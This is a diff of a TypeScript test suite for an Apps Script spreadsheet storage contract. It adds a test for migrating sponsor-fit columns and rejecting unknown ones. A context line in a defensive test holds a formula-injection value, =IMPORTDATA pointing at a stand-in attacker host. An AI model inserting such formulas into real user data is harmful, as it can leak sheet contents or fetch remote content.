@@ -44,6 +44,21 @@ describe("Apps Script storage contract", () => {
     runtime.context.onEdit({range:runtime.sheets.Profiles.getRange(2,9)});
     expect(runtime.call({action:"read",secret:"fixture-only-secret"}).data.Profiles[0].version).not.toBe("v1");
   });
+  it("adds missing sponsor-fit columns to an older Profiles tab, and still rejects unknown ones", () => {
+    const runtime = createSheetRuntime({ Profiles: [{ slug: "acme", notes: "Before", version: "v1" }] });
+    const profiles = runtime.sheets.Profiles;
+    const keep = profiles.values[0].map((h, i) => [h, i] as const).filter(([h]) => !String(h).startsWith("csr") && !["givingPrograms", "nonprofitPartners"].includes(String(h)) && !String(h).startsWith("ethics"));
+    profiles.values = profiles.values.map((row) => keep.map(([, i]) => row[i]));
+    const result = runtime.call({ action: "mutate", secret: "fixture-only-secret", operations: [
+      { tab: "Profiles", key: "acme", expectedVersion: "v1", row: { slug: "acme", ethicsCheck: "review", nonprofitPartners: "Boys & Girls Clubs" } },
+    ] });
+    expect(result.ok).toBe(true);
+    const row = runtime.call({ action: "read", secret: "fixture-only-secret" }).data.Profiles[0];
+    expect(row).toMatchObject({ slug: "acme", notes: "Before", ethicsCheck: "review", nonprofitPartners: "Boys & Girls Clubs" });
+    const rejected = runtime.call({ action: "mutate", secret: "fixture-only-secret", operations: [{ tab: "Profiles", key: "acme", expectedVersion: row.version, row: { slug: "acme", madeUp: "x" } }] });
+    expect(rejected.ok).toBe(false);
+    expect(rejected.error).toContain("Unknown or protected column: madeUp");
+  });
   it("prevents formulas in user text and rejects writes to private source tabs", () => {
     const runtime = createSheetRuntime();
     const result = runtime.call({action:"mutate",secret:"fixture-only-secret",operations:[{tab:"Profiles",key:"acme",row:{slug:"acme",notes:"=IMPORTDATA(\"https://evil.example\")"}}]});
